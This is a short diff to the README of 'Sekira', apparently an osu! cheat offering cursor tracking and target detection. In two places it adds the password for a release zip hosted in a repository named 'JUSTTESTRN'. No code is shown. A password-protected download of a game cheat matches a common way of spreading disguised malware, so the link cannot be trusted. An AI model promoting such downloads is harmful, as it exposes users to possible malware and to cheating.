@@ -8,6 +8,12 @@
     <img src="https://img.shields.io/badge/Download-Sekira_v1.0.1-brightgreen?style=for-the-badge&logo=github&logoColor=white" alt="Download Sekira">
   </a>
 </p>
+
+<p align="centre">
+<p align="center">
+  Password: <code>Sekira</code>
+</p>
+  
 ---
 
 ### ⚡ Key Modules
@@ -48,6 +54,9 @@ Discreet cursor tracking helper with real-time target detection.
   <a href="https://github.com/XPfarmerr/JUSTTESTRN/releases/download/v1.0.1/SekiraOsu.zip">
     <img src="https://img.shields.io/badge/Download-Sekira_v1.0.1-brightgreen?style=for-the-badge&logo=github&logoColor=white" alt="Download Sekira">
   </a>
+</p>
+<p align="left">
+  Password: <code>Sekira</code>
 </p>
 1. Click on the link above to download the latest release.
 
